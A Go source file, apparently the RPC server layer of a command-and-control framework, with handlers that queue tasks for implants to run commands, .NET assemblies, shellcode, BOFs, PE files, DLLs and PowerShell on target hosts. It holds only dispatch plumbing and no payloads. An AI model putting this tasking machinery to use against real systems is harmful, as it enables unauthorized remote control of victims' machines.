package rpc

import (
	"context"
	"github.com/chainreactors/malice-network/helper/types"
	"github.com/chainreactors/malice-network/proto/client/clientpb"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
)

func (rpc *Server) Execute(ctx context.Context, req *implantpb.ExecRequest) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}
	ch, err := rpc.asyncGenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}

	go greq.HandlerAsyncResponse(ch, types.MsgExec)
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) ExecuteAssembly(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}

	ch, err := rpc.asyncGenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}
	go greq.HandlerAsyncResponse(ch, types.MsgAssemblyResponse)
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) ExecuteShellcode(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}

	ch, err := rpc.asyncGenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}
	go greq.HandlerAsyncResponse(ch, types.MsgAssemblyResponse)
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) ExecuteBof(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}

	ch, err := rpc.asyncGenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}
	go greq.HandlerAsyncResponse(ch, types.MsgAssemblyResponse)
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) ExecutePE(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}

	ch, err := rpc.asyncGenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}
	go greq.HandlerAsyncResponse(ch, types.MsgAssemblyResponse)
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) ExecuteDll(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}

	ch, err := rpc.asyncGenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}
	go greq.HandlerAsyncResponse(ch, types.MsgAssemblyResponse)
	return greq.Task.ToProtobuf(), nil
}

func (rpc *Server) ExecutePowershell(ctx context.Context, req *implantpb.ExecuteBinary) (*clientpb.Task, error) {
	greq, err := newGenericRequest(ctx, req)
	if err != nil {
		return nil, err
	}

	ch, err := rpc.asyncGenericHandler(ctx, greq)
	if err != nil {
		return nil, err
	}
	go greq.HandlerAsyncResponse(ch, types.MsgAssemblyResponse)
	return greq.Task.ToProtobuf(), nil
}
